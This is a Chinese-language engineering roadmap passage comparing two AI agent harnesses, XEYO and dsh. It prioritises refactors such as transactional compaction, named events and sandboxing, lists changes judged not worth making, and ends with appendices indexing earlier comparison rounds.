`engine/compact.py` 是**投影层截断**（文件头："送模型投影（不改 MessageStore / JSONL）"）。它做对了很多事：`tool_pair_ranges`（`:69`）保证 cut 点落在配对完整的边界上、`KEEP_TAIL_TOOL_ROUNDS = 3`、`MAX_TOOL_RESULT_CHARS = 8_192`（与 dsh pruner 同值）、`frozen_until` 保证"两次 C1/C2 之间投影字节稳定"。

**剩下的真差距是"事务性"**：

1. **不可回滚**——压缩结果一旦进入投影就是既成事实；dsh 的压缩产生一条**会话事件 + checkpoint**，可以指回"压缩前的状态"；
2. **不可归因**——dsh 的记录纪律（XEYO 自己在 `usage/ledger.py:66-76` 引用过）："压缩走模型的调用必须可归因"。XEYO 有 `_C2_LLM_PREFETCH_MIN_MESSAGES = 24` 的旁路门槛与 `c2_gate()`，但压缩**本身**没有落一条可追溯的事件；
3. **靠事后修补**——`_repair_unpaired_tool_calls` 在 submit 入口做一次性修补，而不是让压缩**事前**不产生孤儿。

###### 为什么依赖 ②

**压缩结果的最自然表达就是一次 `replace`**：把 `[msg_5 … msg_120]` 换成一条摘要事件。所以 §5.2 的通用算子是它的前置。**先做 ②，④（=本文 §5.6）从"新建压缩事务模块"降级为"用已有算子表达压缩结果 + 落一条事件"。**

###### 判据

- **压缩前落一条事件、压缩后落一条事件，两条可配对**（同一 `compact_id`）；
- **压缩前后工具配对平衡**（构造：让 cut 点落在 `tool_use`/`tool_result` 中间，断言投影侧无孤儿）；
- **可归因**：C2 走的那次模型调用在账本里能查到，且标注为"压缩归因"。

###### 风险

R=3。压缩直接改变模型可见历史长度，做错会影响长会话行为。**必须有用例先钉住"压缩后模型仍能看到最近 3 轮工具配对"**。

---

##### §6 组合：为什么这几个点的收益是**乘法**而不是加法

单看每个点，收益是线性的；但**这四个点之间存在真实的依赖与放大关系**，这才是"完美优化"的完整图景。

```
        ┌──────────────────────────────────────────────┐
        │ ① 命名事件瀑布（只命名 + 观测）              │
        │    提供：拦截点在哪 · 引擎做了什么可观测      │  ← 杠杆核心
        └───────────────┬──────────────────────────────┘
                        │ 让下面两件事从"改巨石"变成"挂监听"
          ┌─────────────┴─────────────┐
          ▼                           ▼
┌──────────────────────┐   ┌──────────────────────────┐
│ ④ hooks 事件面扩展    │   │ ⑤ C2 压缩事务化          │
│  产品生态面可拦截      │   │  压缩可归因 + 可回滚      │
└──────────┬───────────┘   └──────────┬───────────────┘
           │  铺好"失败时怎么优雅降级"  │  依赖通用算子
           ▼                          ▼
        ┌──────────────────────────────────────────────┐
        │ ③ 沙箱 confine + Windows restricted-token    │
        │    唯一改变行为边界 · 唯一无法旁路验证        │
        └──────────────────────────────────────────────┘

        ┌──────────────────────────────────────────────┐
        │ ② 投影层通用 replace 算子 + sourceEventSeqs   │
        │    提供：统一的"改写过去"通道 → ⑤ 的前置      │
        └──────────────────────────────────────────────┘

        （⑥ 撕裂尾 + 租约：独立，任何时候都能做，但不影响其他点）
```

###### 三组真实的依赖关系

**依赖 A：① → ⑤ 与 ④。** 压缩事务化要在"压缩前"发射一条事件，hooks 要挂 `PreCompact`——**没有命名事件，这两件事都得再改一次 `query_loop.py`**。

**依赖 B：② → ⑤。** 压缩结果的表达需要通用 `replace`；否则只能再造一个 `_OP_COMPACT` 单用途 op，**复制 `rewind` 的老路**（单用途算子堆叠 = 今天多个机制无法统一的根因）。

**依赖 C：① 与 ④ → ③。** 沙箱是唯一改变行为边界的改动。它需要一个"失败时优雅降级"的通道（否则 confine 拒绝命令后模型无从得知该换路），以及一个"拦截点在哪可观测"的能力（否则无法调试为什么某条命令被拒）。**这两条正是 ① 与 ④ 提供的。**

###### 反过来的乘法：③ 一旦落地，会**让已有的复杂机制变简单**

这是 ③ 虽排第三、却值得做的最重要理由——它**减少**复杂度而非增加：

| 现有机制 | 沙箱落地后的处境 |
|---|---|
| `permissions/policy.py` 11 级判定分支 | 相当一部分是为"补隔离缺失"而存在 → 有资格收粗 |
| `permissions/bash_policy.py` 的 `_DENY_RULES` | 从"安全边界"降级为"防误操作" → 可以收窄 |
| 193 行 bash 语义分析反推写目标 | 不再需要承担安全职责 |
| `bash_mode=="allow"` 时的 `XEYO_BASH_UNSAFE_ALLOW` 兜底 | 补丁可以退役 |
| `win_job.py`（Job Object） | 保留（资源限额仍有价值），但不再被误当作隔离 |

**所以正确的顺序恰好不是"先做收益最大的"，而是"先做让最大收益变得可安全落地的"。**

###### 实施顺序（按依赖，不按分数）

```
第 0 步（独立，可立刻并行）
  ⑥ 撕裂尾修复 + 跨进程租约          ← S 级、零风险、建立"构造性测试"节奏

第 1 步（三者互相成全，建议同批）
  ① 命名事件瀑布（只命名 + 观测）
  ② 投影层通用 replace 算子 + sourceEventSeqs
  ④ hooks 事件面扩展（兑现预留的 3 个事件）

第 2 步（依赖第 1 步）
  ⑤ C2 压缩事务化

第 3 步（唯一"换地基"，必须最后）
  ③ 沙箱 confine + Windows restricted-token 后端

随时可做（不阻塞）
  ⑦ 会话事件自查询工具 · ⑧ 覆盖率 ratchet · ⑨ 时间触发型定时任务
```

---

##### §7 反面清单：看起来收益大，其实不是

这一节和"该做什么"同等重要——**五轮里最容易犯的错是照着 dsh 补一个 XEYO 已经有的东西，或者补一个不该补的东西。**

###### 7.1 ❌ 记忆召回重开 —— 最大的"沉睡收益"陷阱

XEYO 有 `python/memory/`（48 文件）的完整记忆子系统，而实时召回是**恒关**的。乍看这是"巨大沉睡收益"——把开关打开就白赚一个 dsh 完全没有的能力。

**但这不是优化机会，是用户已经裁决过的下线项。** `engine/query_loop.py:355-363` 原文：

```python
def _memory_index_live_enabled() -> bool:
    """Memory 索引常驻注入开关：**恒关**（2026-09-09 用户裁决维持下线）。

    事故 sess_mtiche8l（弱模型把索引条目当任务对象）后已退役，AGENTS「已下线」
    与此对齐。注入走 project_for_model 的 _append_memory_index 仍供脚本/评测用，
    生产投影层不推送；settings/env 残留一律忽略（同其他固化恒关项）。受控重开
    须源码级改此函数 + A1（200+ 轮 live）/ A3 过门证据。
    """
    return False
```

**"恒关" + 事故编号 + 需 A1/A3 过门证据** ——三项都在说同一件事：这不是一个待办，是一个**带门禁的已裁决决策**。`memory/memory_switches.py:48` 还专门注明"`engine/query_loop._memory_index_live_enabled` 恒 False（**不看本键**）"，即 settings/env 都穿不过去。把它列进优化清单是**不了解项目史**。

###### 7.2 ❌ 照 dsh 补 spill / 补工具配对平衡

本文 §1 已详述：这两项**都已实现**，且实现质量不低于 dsh（XEYO 还多了一层 dsh 没有的**族语义压缩** `cmd_compact.py`）。照着补 = 重写已有代码。

**这条的教训值得单独记**：清单式读法（读对面有什么 → 看自己缺什么）在**否定判断**上极不可靠。写优化建议前必须先在被建议方全仓搜同义词，而不是只读被点名的那几个文件。

###### 7.3 ❌ 前端插槽化（对齐 dsh 的 45 个 ui 包）

`gui/src` 是 **134 个 `.tsx` 的单体**，`registerSlot|slots|pluginRegistry` **零命中**。差距真实存在。

**但不该做**：dsh 是 5 个应用形态共享一套 UI（`packages/client` **45 个子包**），插槽化是为**多形态复用**服务的；XEYO 只有一个桌面形态。把 134 个组件拆成 45 个包，收益是"结构好看"，成本是巨大重构 + 构建复杂度上升。**这是"对面有所以我该有"的典型误判。**

###### 7.4 ❌ Typert RPC / Cordis 式 255 包重组

dsh 的 `packages/typert` 类型图 RPC 是为"多语言 SDK + 多形态客户端"服务的。XEYO 的 SSE 事件流 + 生成式 manifest 已经在解决同一问题（`slash/registry.py` 35 条命令的 SSOT + 生成式 manifest 门禁）。**换协议风格不产生能力增益。**

###### 7.5 ❌ per-file 100% 覆盖率门

dsh 的门是 per-file 100%。XEYO 应做的是 **ratchet**（只升不降），不是 100%。100% 会逼出大量为覆盖而写的空测试，反而使测试失去信号。**上一份收官文档已把它降级为"覆盖率 ratchet"，本文维持。**

###### 7.6 ❌ 把沙箱排第一

§5.3 已论证：它是唯一改变行为边界、唯一无法旁路验证、且会让权限链部分作废的改动。**收益第一 ≠ 顺序第一。**

###### 7.7 ❌ 重写 `query_loop.py`

2,000 行巨石，但 `AGENTS.md` 的处方是"**只留接线点**"，不是"重写"。§5.1 的命名事件正是这个处方的执行方式。重写会撕掉大量已踩过坑的细节（`_EARLY_BLOCKLIST`、`_cancel_early_tasks` 的 4 个取消点、投机提前执行、`rejected_early` 的 `:1560-1565` 处理）。

###### 7.8 ❌ 忽略 XEYO 已经比 dsh 强的地方

对照时容易产生"对面更完整"的错觉。实测 XEYO **独有且成熟**的机制至少包括：

| XEYO 独有 | 规模/证据 | dsh 对应物 |
|---|---|---|
| **工作区回滚 rewind** | `python/rewind/` **12 文件 5,343 行**（三把锁 / 两张终态转移表 / 内容寻址 blob / 影子 git / 前置校验状态机） | **无**（dsh 只做对话侧 surface 投影） |
| **T_now 注入管线** | 20 块登记 + 硬顶 21 + `6000/2500/6000/4000` 三层预算 + 机器执法测试 | **无** |
| **投机提前执行** | `early_readonly_tools_enabled()` `:112`、`_eligible_for_early` `:155`、`_cancel_early_tasks` `:179` | **无** |
| **族语义压缩** | `cmd_compact.py` 6 个压缩器 | 通用 head/tail |
| **跨会话记忆子系统** | `python/memory/` 48 文件（召回恒关但子系统在） | **无** |
| **成本治理** | 账本 + 峰谷 + 归因 + 数据驱动定价 | **无** |
| **Tauri 原生壳** | 进程守护 + `python_exe_usable()` 真探测 + 自包含 slim venv 断言 | **无** |

**"完美优化 XEYO"的第一条纪律是不要破坏这些。** 尤其 rewind（5,343 行）——任何改动投影层或 transcript 的点，都必须先确认 rewind 的兼容性契约仍然成立（`surface.py` 文件头专门有一节 `兼容性` 讲这件事）。

---

##### §8 一页结论

###### 该做的（按依赖排序，不按分数排序）

| 序 | 点 | 综合分 | 为什么是它 |
|---|---|---|---|
| 0 | **JSONL 撕裂尾修复 + 跨进程租约** | 20.5 | 全表唯一三项满分：S 级成本、零风险、完美适配。不是收益最大，是**性价比最高**，且建立"构造性测试"节奏 |
| 1 | **命名事件瀑布**（只命名 + 观测） | **30.0** | 综合第一。杠杆满分——把后续一切的入口从"改 2,000 行巨石"变成"挂命名事件"，且是 `AGENTS.md` 反巨石条文的直接执行 |
| 1 | **投影层通用 `replace` 算子 + `sourceEventSeqs`** | 27.5 | 适配满分。层已存在（150 行），只扩算子；是"压缩/覆盖/注入统一走一条路"的地基 |
| 1 | **hooks 事件面扩展**（兑现预留的 3 个事件） | 25.5 | 兑现自己开的欠条，扩的是产品生态面；执行器已完整，成本近零 |
| 2 | **C2 压缩事务化** | 23.0 | 依赖上面两个，做完后从"新建模块"降级为"用已有算子表达 + 落一条事件" |
| 3 | **沙箱 confine + Windows restricted-token 后端** | 26.5 | **收益量级第一**（10/10），必须最后：唯一改变行为边界、唯一无法旁路验证，且会让权限链部分作废。dsh 有 Windows 后端可直接对照移植 |
| 随时 | 会话事件自查询工具 / 覆盖率 ratchet / 时间触发型定时任务 | 20.0 / 20.0 / 18.0 | 不阻塞、不依赖前面任何点 |

###### 不该做的

- ❌ 记忆召回重开（**用户已裁决恒关**，带事故编号与 A1/A3 门禁）
- ❌ 照 dsh 补 spill / 补工具配对平衡（**都已实现**）
- ❌ 前端插槽化、Typert RPC、Cordis 式 255 包重组、per-file 100% 覆盖率门
- ❌ 把沙箱排第一
- ❌ 重写 `query_loop.py`

###### 两条必须守住的红线

1. **沙箱不得按执行通道分叉**——出现"容器路由就跳过"这类条件分支即属应试修改，`AGENTS.md` 明文禁止；
2. **会话自查询工具必须无条件注册**——出现 `XEYO_BENCH_MINIMAL` 分支即应试。

###### 一句话

> **XEYO 的问题从来不是"缺功能"，是"缺一层"——而最好的补法不是照着对面重建那一层，是先把已有的肌理（投影层 / 接缝 / 侧挂）扩成通用形态，再用命名事件把它们串起来。收益量级最大的是沙箱，但最优的第一笔投入是"命名事件瀑布 + 投影层算子"这两个低成本、零风险、杠杆满分的点。**

---

##### 附：本文的取证边界

| 项 | 说明 |
|---|---|
| 复核方式 | 本轮直接读源码（`Read` + Python 脚本切片），**不依赖任何子代理转述** |
| 已复核的实现文件 | `tools/spill.py`、`tools/spill_shadow.py`、`tools/bash_tool/truncate.py`、`tools/tool_registry.py`、`tools/meta.py`、`engine/compact.py`、`engine/query_loop.py`、`session/surface.py`、`session/record_transcript.py`、`sidecar/policy.py`、`sidecar/upgrade.py`、`extension/hooks.py`、`extension/config.py`、`permissions/*`（承接前轮） |
| dsh 侧复核 | `packages/hooks/hooks-claude-code/src/*.ts`（6 个 hook 点）、`packages/core/session/src/surface.ts`、`packages/sandbox/sandbox-windows-acl` |
| 未复核（承接前轮结论） | `rewind/*` 细节（第五轮已全文精读）、`cmd_compact.py` 内部压缩算法、`gui/src` 组件内部 |
| 与前轮的冲突处理 | **以本文为准**。本文为做收益判断重跑了关键证据，已推翻第一/三/六轮在 spill、配对平衡、投影层上的"缺失"判定 |






# 附录

> 覆盖自检与源文档索引。

## 附 A · 第四轮覆盖自检

> 来源：**R4 枚举面·逐字段级对比** · 原节「§19 本轮覆盖自检」（源 L1451–1497）

##### §19 本轮覆盖自检

**精读的文件（`Read` 全文或 Python 逐段）**

| 侧 | 文件 | 方式 |
|---|---|---|
| dsh | `core/session/src/types.ts` | Read 全文（484 行） |
| dsh | `core/tools/src/types.ts` | Read 全文（59 行） |
| dsh | `core/agent-loop/src/constants.ts`、`tool-calls.ts`、`agent.ts`、`assistant-stream.ts` | 前轮 Read（本轮未重读） |
| dsh | `guard/repeat-tool-reminder/src/index.ts` | cat 全文 |
| dsh | `guard/timeout-policy/src/index.ts` | cat 全文 |
| dsh | `sandbox/sandbox/src/index.ts`（节选）、`sandbox-local/src/profiles.ts` | 切片 |
| dsh | `sandbox/sandbox-policy/src/index.ts`（1-120）、`session-mode.ts` | 切片 |
| dsh | `spill/spill-policy/src/index.ts`（1-130）、`types.ts` | 切片 |
| dsh | `compaction/compaction-basic/src/config.ts` | cat 全文 |
| dsh | `compaction/compaction-basic/src/region.ts`（1-80） | 切片 |
| dsh | `compaction/compaction-tool-result-pruner/src/config.ts` | cat 全文 |
| dsh | `hooks/hook-protocol/src/types.ts`、`events.ts` | cat 全文 |
| dsh | `hooks/hooks-claude-code/src/config.ts`（1-40） | 切片 |
| dsh | `llm/llm/src/types.ts` | Python 逐 interface |
| dsh | `subagent/subagent/src/descriptor.ts`（51-105） | 切片 |
| dsh | `interaction/permission-presets/src/types.ts` | 切片 |
| dsh | `docs/tool-catalog.md` | 系统提取 |
| dsh | `docs/testing.md` | 系统提取 |
| XEYO | `python/tools/meta.py` | Read 全文（414 行） |
| XEYO | `python/msgtypes/events.py` | Read 全文（333 行） |
| XEYO | `python/prompt/pre_llm_inject.py` | 逐段（登记表/装配/裁剪/常量） |
| XEYO | `python/prompt/turn_context.py` | 逐段（3 个注入函数） |
| XEYO | `python/permissions/policy.py`（1319-1470 + 符号表） | 切片 |
| XEYO | `python/tools/catalog.py` | 逐段（注册校验 + BENCH_MINIMAL） |
| XEYO | `python/engine/query_loop.py`（726-845 + 1940-2000 + 符号表） | 切片 |
| XEYO | `python/extension/hooks.py` | 全文结构 + 前 70 行 |
| XEYO | `python/extension/config.py` | 逐段 |
| XEYO | `python/slash/registry.py` | 系统提取 + 前 60 行 |
| XEYO | `python/usage/pricing.py`（1-4200 字节） | 切片 |
| XEYO | `python/server/routers/chat.py` | 系统提取（帧清单 + 产帧点上下文） |
| XEYO | `server/routers/*.py` × 17 | 正则提取全部路由 |

**未见 / 未逐行读（诚实边界）**

- dsh：`core/tools/src/{json-schema,schema,ptc,ts-types,py-types}.ts`（schema 生成三条路径仅知存在，未读实现）；`core/agent-loop/src/agent.ts` 本轮未重读（前轮已读）；`sandbox/sandbox-local/src/index.ts` 全文（仅读 profiles + 引用行）；`sandbox-windows-acl/*` 9 文件（仅知结构）；`packages/e2b/`；`typert` 类型图实现；`client/ui-*` 47 包内部（按 slots 机制理解，未逐行）；`session-query` 5 工具入参细节（仅知名与包）。
- XEYO：`permissions/policy.py` 第 1470 行之后的分支（`ui_ask` / `read_path` / `write_path` / `agent_allow` / `_evaluate_bash` 194 行内部逻辑）；`gui/src/lib` 165 文件内部；`tui/` 内部；`memory/` 27 模块内部（仅知文件名与 `runtime.py` 函数名）；`server/routers/chat.py` 1000 行之前的请求装配段。

**否定判断的穷举范围**：所有「XEYO 无 X」结论均在 `--exclude-dir=.venv --exclude-dir=__pycache__` 下全仓 `python/` 检索得出；所有「dsh 无 X」在 `packages/` 全树检索得出。

---

## 附 B · 源文档分节索引（自动生成）

> 用途：反向定位。任意一条结论都能从这里查到它来自哪份文档的哪一节、原始行号是多少。

### R1 · R1 功能面·全量对比

路径 `docs/XEYO-vs-DeepSeekHarness-全量对比.md` · 共 605 行 · 31 节

| # | 节标题 | 源行号 | 行数 |
|---|---|---|---|
| 0 | XEYO × DeepSeek Harness（dsh）全量对比 | L1–6 | 6 |
| 1 | 0. 取证口径（先说清楚我读了什么） | L7–30 | 24 |
| 2 | 1. 定位 | L31–43 | 13 |
| 3 | 2. 顶层架构范式 | L44–71 | 28 |
| 4 | 3. 运行入口与产品形态 | L72–82 | 11 |
| 5 | 4. Agent 主循环 | L83–111 | 29 |
| 6 | 5. 会话数据模型（**最大的结构差异**） | L112–148 | 37 |
| 7 | 6. 上下文投影与压缩 | L149–161 | 13 |
| 8 | 7. System Prompt 与「模型可见文本」策略 | L162–180 | 19 |
| 9 | 8. 工具系统：逐工具对照 | L181–260 | 80 |
| 10 | 9. 工具执行管线 | L261–276 | 16 |
| 11 | 10. 权限与审批 | L277–293 | 17 |
| 12 | 11. 沙箱与隔离 | L294–308 | 15 |
| 13 | 12. 文件系统 | L309–320 | 12 |
| 14 | 13. 子代理与多代理 | L321–334 | 14 |
| 15 | 14. 调度 / 后台任务 / Webhook / 工作流 | L335–345 | 11 |
| 16 | 15. Skill 系统 | L346–356 | 11 |
| 17 | 16. MCP 与扩展层 | L357–371 | 15 |
| 18 | 17. Hooks | L372–383 | 12 |
| 19 | 18. 模型层与 provider | L384–397 | 14 |
| 20 | 19. 成本与用量 | L398–407 | 10 |
| 21 | 20. 记忆 | L408–418 | 11 |
| 22 | 21. 前端 | L419–445 | 27 |
| 23 | 22. 服务端与协议 | L446–457 | 12 |
| 24 | 23. 对外集成（SDK / ACP / CLI） | L458–469 | 12 |
| 25 | 24. 凭据 / 设置 / 身份 / 遥测 | L470–480 | 11 |
| 26 | 25. 测试与质量门 | L481–496 | 16 |
| 27 | 26. 构建 / 打包 / 分发 | L497–509 | 13 |
| 28 | 27. 文档与协作规范 | L510–521 | 12 |
| 29 | 28. 差异总表 | L522–585 | 64 |
| 30 | 29. 结论 | L586–605 | 20 |

### R2 · R2 设计面·设计级对比

路径 `docs/XEYO-vs-DeepSeekHarness-设计级对比-第二轮.md` · 共 1307 行 · 35 节

| # | 节标题 | 源行号 | 行数 |
|---|---|---|---|
| 0 | XEYO × DeepSeek Harness（dsh）设计级对比 · 第二轮 | L1–18 | 18 |
| 1 | 0. 先说两处更正（第一轮的错误） | L19–102 | 84 |
| 2 | 1. 设计范式总纲：两个第一性问题 | L103–140 | 38 |
| 3 | 2. Agent 主循环 | L141–214 | 74 |
| 4 | 3. 会话数据模型与持久化 | L215–260 | 46 |
| 5 | 4. 上下文投影与 KV 前缀保护 | L261–291 | 31 |
| 6 | 5. 压缩与预算 | L292–322 | 31 |
| 7 | 6. System Prompt 组装 | L323–355 | 33 |
| 8 | 6.5 逐轮注入管线：T_now vs「无治理」——两端差距最大的注意力机制 | L356–438 | 83 |
| 9 | 7. 工具系统（抽象 · 注册 · 生命周期）★重点样例 | L439–522 | 84 |
| 10 | 8. 工具执行管线 | L523–587 | 65 |
| 11 | 9. 权限与审批 | L588–636 | 49 |
| 12 | 10. 沙箱与执行隔离 | L637–681 | 45 |
| 13 | 11. 文件系统能力与策略 | L682–716 | 35 |
| 14 | 12. Shell / 终端 / 子进程 | L717–747 | 31 |
| 15 | 13. 模型层与 provider | L748–781 | 34 |
| 16 | 14. 代码运行时与 LSP | L782–804 | 23 |
| 17 | 15. 成本与用量 | L805–834 | 30 |
| 18 | 16. 记忆子系统 | L835–862 | 28 |
| 19 | 17. 子代理与多代理 | L863–896 | 34 |
| 20 | 18. 调度 / 后台任务 / 工作流 / Webhook | L897–928 | 32 |
| 21 | 19. Skill 系统 | L929–960 | 32 |
| 22 | 20. MCP 集成 | L961–991 | 31 |
| 23 | 21. Hooks | L992–1010 | 19 |
| 24 | 22. 扩展组合机制 | L1011–1048 | 38 |
| 25 | 23. 服务端与协议 | L1049–1081 | 33 |
| 26 | 24. 前端架构 | L1082–1113 | 32 |
| 27 | 25. 桌面壳与进程管理 | L1114–1133 | 20 |
| 28 | 26. 对外集成（CLI / SDK / ACP） | L1134–1148 | 15 |
| 29 | 27. 配置 / 凭据 / 身份 / 遥测 | L1149–1163 | 15 |
| 30 | 28. 测试与质量门 | L1164–1181 | 18 |
| 31 | 29. 构建 / 打包 / 分发 | L1182–1196 | 15 |
| 32 | 30. 文档与协作规范 | L1197–1211 | 15 |
| 33 | 31. 设计层差异总表 | L1212–1274 | 63 |
| 34 | 32. 结论 | L1275–1307 | 33 |

### R3 · R3 实现面·实现级对比

路径 `docs/XEYO-vs-DeepSeekHarness-实现级对比-第三轮.md` · 共 2246 行 · 31 节

| # | 节标题 | 源行号 | 行数 |
|---|---|---|---|
| 0 | XEYO ⟷ DeepSeek Harness 全量对比 · 第三轮：实现级 | L1–19 | 19 |
| 1 | 1. Agent 主循环：实现级 | L20–245 | 226 |
| 2 | 2. 会话数据模型：实现级 | L246–342 | 97 |
| 3 | 3. 上下文投影与 KV 前缀保护：实现级 | L343–409 | 67 |
| 4 | 4. 压缩与预算：实现级 | L410–457 | 48 |
| 5 | 5. System Prompt 组装：实现级 | L458–547 | 90 |
| 6 | 6. T_now 注入管线：实现级（XEYO 独有） | L548–713 | 166 |
| 7 | 7. 工具系统：实现级 | L714–890 | 177 |
| 8 | 8. 工具执行管线：实现级 | L891–967 | 77 |
| 9 | 9. 权限与审批：实现级 | L968–1161 | 194 |
| 10 | 10. 沙箱与执行隔离：实现级 | L1162–1271 | 110 |
| 11 | 11. 文件系统能力：实现级 | L1272–1338 | 67 |
| 12 | 12. Shell / 终端 / 子进程：实现级 | L1339–1382 | 44 |
| 13 | 13. 模型层与流式协议：实现级 | L1383–1437 | 55 |
| 14 | 14. 成本与用量：实现级 | L1438–1525 | 88 |
| 15 | 15. 记忆子系统：实现级 | L1526–1580 | 55 |
| 16 | 16. 子代理与多代理：实现级 | L1581–1633 | 53 |
| 17 | 17. 调度 / 后台 / 工作流 / Webhook：实现级 | L1634–1705 | 72 |
| 18 | 18. Skill 系统：实现级 | L1706–1763 | 58 |
| 19 | 19. MCP 集成：实现级 | L1764–1804 | 41 |
| 20 | 20. Hooks：实现级 | L1805–1868 | 64 |
| 21 | 21. 扩展组合机制：实现级 | L1869–1916 | 48 |
| 22 | 22. 服务端与协议：实现级 | L1917–1980 | 64 |
| 23 | 23. 前端架构：实现级 | L1981–2016 | 36 |
| 24 | 24. 桌面壳与进程管理：实现级 | L2017–2047 | 31 |
| 25 | 25. 对外集成（CLI / SDK / ACP）：实现级 | L2048–2081 | 34 |
| 26 | 26. 配置 / 凭据 / 身份 / 遥测：实现级 | L2082–2097 | 16 |
| 27 | 27. 质量门与测试：实现级 | L2098–2146 | 49 |
| 28 | 28. 构建 / 打包 / 分发：实现级 | L2147–2160 | 14 |
| 29 | 29. 实现级差异总表 | L2161–2206 | 46 |
| 30 | 30. 结论与取证边界 | L2207–2246 | 40 |

### R4 · R4 枚举面·逐字段级对比

路径 `docs/XEYO-vs-DeepSeekHarness-逐字段级对比-第四轮.md` · 共 1505 行 · 22 节

| # | 节标题 | 源行号 | 行数 |
|---|---|---|---|
| 0 | XEYO × DeepSeek Harness 逐字段级对比（第四轮） | L1–29 | 29 |
| 1 | §0 本轮方法、取证边界与三处更正 | L30–66 | 37 |
| 2 | §1 会话数据模型：逐事件、逐字段 | L67–250 | 184 |
| 3 | §2 工具协议：逐字段 | L251–423 | 173 |
| 4 | §3 工具执行管线：逐阶段、逐拦截点 | L424–507 | 84 |
| 5 | §4 权限判定：逐分支 | L508–598 | 91 |
| 6 | §5 审批与提问：逐字段 | L599–644 | 46 |
| 7 | §6 T_now 注入管线：20 块逐块全文 | L645–745 | 101 |
| 8 | §7 `env_channel` 声道：逐字段 | L746–791 | 46 |
| 9 | §8 沙箱：逐平台、逐参数 | L792–872 | 81 |
| 10 | §9 截断与压缩：逐常量 | L873–953 | 81 |
| 11 | §10 LLM 层：逐字段与流式协议 | L954–1015 | 62 |
| 12 | §11 Hooks：wire 协议逐字段 | L1016–1091 | 76 |
| 13 | §12 Skill / 子代理：逐字段 | L1092–1154 | 63 |
| 14 | §13 调度 / 后台 / 工作流：逐字段 | L1155–1169 | 15 |
| 15 | §14 服务端协议：XEYO 101 路由逐条 + 23 帧 | L1170–1241 | 72 |
| 16 | §15 前端与桌面壳：逐模块 | L1242–1295 | 54 |
| 17 | §16 工程门禁：逐条 | L1296–1335 | 40 |
| 18 | §17 字段级差异总矩阵 | L1336–1387 | 52 |
| 19 | §18 行为对照用例：同一任务在两端各发生什么 | L1388–1450 | 63 |
| 20 | §19 本轮覆盖自检 | L1451–1497 | 47 |
| 21 | §20 本轮结论（一句话级） | L1498–1505 | 8 |

### R5 · R5 机制面·机制设计说明

路径 `docs/XEYO-vs-DeepSeekHarness-机制设计说明-第五轮.md` · 共 2017 行 · 35 节

| # | 节标题 | 源行号 | 行数 |
|---|---|---|---|
| 0 | XEYO × DeepSeek Harness 实现机制设计说明（第五轮） | L1–8 | 8 |
| 1 | §0 本轮的定位：从"有什么"转向"怎么运转" | L9–25 | 17 |
| 2 | §1 机制总目录 | L26–56 | 31 |
| 3 | Part A — dsh 实现机制设计说明 | L57–58 | 2 |
| 4 | A-1 事件溯源日志机制：日志是唯一真值，上下文是它的投影 | L59–127 | 69 |
| 5 | A-2 崩溃恢复机制：把中断的尾巴补成合法 transcript | L128–172 | 45 |
| 6 | A-3 请求纪元快照机制：让"模型当时看到什么"可逐字重建 | L173–217 | 45 |
| 7 | A-4 System Prompt 组装机制：有序插槽 + 作用域遮蔽 + complete 还原 | L218–276 | 59 |
| 8 | A-5 运行上下文快照机制：让"易变事实"既进上下文又不破坏缓存 | L277–340 | 64 |
| 9 | A-6 工具执行瀑布机制：5 个可拦截点 + 三段返回值 | L341–406 | 66 |
| 10 | A-7 工具并发调度机制：派发可重叠，提交必按模型序 | L407–482 | 76 |
| 11 | A-8 沙箱 confine 机制：一个函数把政策编译成 argv | L483–575 | 93 |
| 12 | A-9 压缩事务机制：括号事务 + 工具配对平衡 + 影子计价 | L576–665 | 90 |
| 13 | A-10 会话持久化机制（JSONL）：写后缓冲 + 单写者 + 撕裂尾修复 | L666–741 | 76 |
| 14 | A-11 会话 fork / 继承机制：用一条计数切开"父的"与"我的" | L742–795 | 54 |
| 15 | Part B — XEYO 实现机制设计说明 | L796–797 | 2 |
| 16 | B-1 T_now 注入管线：把易变内容挡在 system 前缀之外 | L798–880 | 83 |
| 17 | B-2 env_channel 声道：伪造一对只存在于投影的 tool 对 | L881–950 | 70 |
| 18 | B-3 权限判定链：先硬拦（不可被授权穿越）再分派 | L951–1024 | 74 |
| 19 | B-4 Bash 策略：正向白名单 + 否定式复合拒绝 | L1025–1085 | 61 |
| 20 | B-5 授权指纹：身份与参数分离 | L1086–1144 | 59 |
| 21 | B-6 审批挂起：风险分级 TTL + 幂等 resolve | L1145–1234 | 90 |
| 22 | B-7 rewind v2：内容寻址 + 事件日志 + 括号事务 | L1235–1396 | 162 |
| 23 | B-8 rewind v3 热路径：崩溃顺序合同 + orphan 先落盘 | L1397–1498 | 102 |
| 24 | B-9 rewind 存储回收：可达性 + 预算驱动 + dry-run 永不触盘 | L1499–1547 | 49 |
| 25 | B-10 影子 git 与工作区指纹：只读元数据，不读内容 | L1548–1609 | 62 |
| 26 | B-11 写入通道：每文件单写者 + 内容哈希版本校验 + 未读拒绝 | L1610–1704 | 95 |
| 27 | B-12 预算与收尾窗口：多软上限共享一个 grace | L1705–1792 | 88 |
| 28 | B-13 成本账本：按真实厂商计价 + 请求级归因 | L1793–1870 | 78 |
| 29 | Part C — 机制对照矩阵 | L1871–1872 | 2 |
| 30 | C-1 同构问题：两端在解同一道题，答案不同 | L1873–1947 | 75 |
| 31 | C-2 单侧独有机制 | L1948–1975 | 28 |
| 32 | C-3 一个值得单独说的反向事实 | L1976–1983 | 8 |
| 33 | C-4 五轮累计结论 | L1984–2006 | 23 |
| 34 | C-5 取证边界（本轮） | L2007–2017 | 11 |

### R6 · 决策 A·优化路线五轮总结

路径 `docs/XEYO-开源优化路线-五轮总结.md` · 共 532 行 · 32 节

| # | 节标题 | 源行号 | 行数 |
|---|---|---|---|
| 0 | 五轮对比总结：最适合用来优化 XEYO 的点 | L1–10 | 10 |
| 1 | §0 五轮回顾（一页纸） | L11–12 | 2 |
| 2 | 0.1 五轮各自产出了什么 | L13–24 | 12 |
| 3 | 0.2 五轮读下来的三句话 | L25–35 | 11 |
| 4 | 0.3 一个必须先说的口径修正 | L36–41 | 6 |
| 5 | §1 筛选准则：什么叫"适合用来优化 XEYO" | L42–60 | 19 |
| 6 | §2 落笔前新增核实的三处事实更正（重要） | L61–64 | 4 |
| 7 | 2.1 更正一：XEYO **已经有投影层**，差距是"算子种类"而不是"有没有层" | L65–97 | 33 |
| 8 | 2.2 更正二：XEYO 的 JSONL **已有写后缓冲 + fsync + 轮转**，只缺"撕裂尾修复 + 跨进程租约" | L98–119 | 22 |
| 9 | 2.3 更正三（**本文最重要**）：dsh 的沙箱**有 Windows 后端**，XEYO 可以直接对照移植 | L120–156 | 37 |
| 10 | §3 候选池与排序（核心结论） | L157–158 | 2 |
